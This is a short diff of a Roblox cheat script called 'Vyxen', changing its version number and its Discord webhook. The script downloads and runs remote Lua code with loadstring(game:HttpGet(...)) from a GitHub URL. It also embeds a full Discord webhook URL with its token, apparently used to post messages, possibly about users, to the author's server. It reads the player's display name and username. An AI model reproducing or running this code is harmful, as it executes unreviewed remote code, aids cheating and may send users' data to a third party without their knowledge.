@@ -1,5 +1,5 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Lvsyyy/UI/main/Library"))()
-local Window = Library:CreateWindow("Vyxen ", "Version: 5 | Welcome! " .. game.Players.LocalPlayer.DisplayName .. " (@" .. game.Players.LocalPlayer.Name .. ")", 10044538000)
+local Window = Library:CreateWindow("Vyxen ", "Version: 6 | Welcome! " .. game.Players.LocalPlayer.DisplayName .. " (@" .. game.Players.LocalPlayer.Name .. ")", 10044538000)
 local Tab = Window:CreateTab("Functions")
 local Page100 = Tab:CreateFrame("Update Log")
 local Page1 = Tab:CreateFrame("Universal")
@@ -742,7 +742,7 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/1096948499620311073/NbYKLeykGUNxEDb5icN-E1lR5CFFPJ2uPLS57VC4DsuyKJfVPa7w7eAgtR2xm1IVm-oB"
+   "https://discord.com/api/webhooks/1098774391136976916/rFhB9d7oBRUfb3LLeCFx_KmJ8yh-lLZspCH8Wd7gCDemxq2ohsDzADOHegQJVGfxLvVC"
 
 local data = {
    ["content"] = " @everyone",
